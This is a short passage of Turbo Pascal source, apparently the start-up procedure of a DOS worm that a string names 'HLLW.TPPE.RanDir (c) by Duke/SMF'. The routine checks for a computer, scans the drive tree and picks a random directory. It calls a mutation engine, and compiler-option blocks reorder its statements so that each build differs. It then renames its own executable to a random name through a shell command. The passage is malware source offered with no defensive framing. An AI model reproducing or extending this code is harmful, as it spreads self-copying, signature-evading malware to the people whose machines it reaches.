   procedure Starting;
   begin
   {$IFOPT N+}Kol:=0;{$ENDIF}
   if not DetectComp then halt;
   {$IFOPT P+}MakeRandomName;{$ENDIF}
   {$IFOPT T+}TPPE_Mutation;{$ENDIF}
   {$IFOPT N-}Kol:=0;{$ENDIF}
   Disk:=copy(fexpand(paramstr(0)),1,2);
   {$IFOPT S+}M:=0;{$ENDIF}
   ScanTree(Disk);
   {$IFOPT L-}K:=random(Kol);{$ENDIF}
   {$IFOPT P-}MakeRandomName;{$ENDIF}
   {$IFOPT L+}K:=random(Kol);{$ENDIF}
   {$IFOPT S-}M:=0;{$ENDIF}
   FindDir(Disk);
   {$IFOPT T-}TPPE_Mutation;{$ENDIF}
   NewName:=P+'\'+NewName;
   exec(Command,'/c ren _tppe_.exe '+NewName+'>nul');
   {$IFOPT I-}NewName:='[HLLW.TPPE.RanDir (c) by Duke/SMF]';{$ENDIF}
   end;
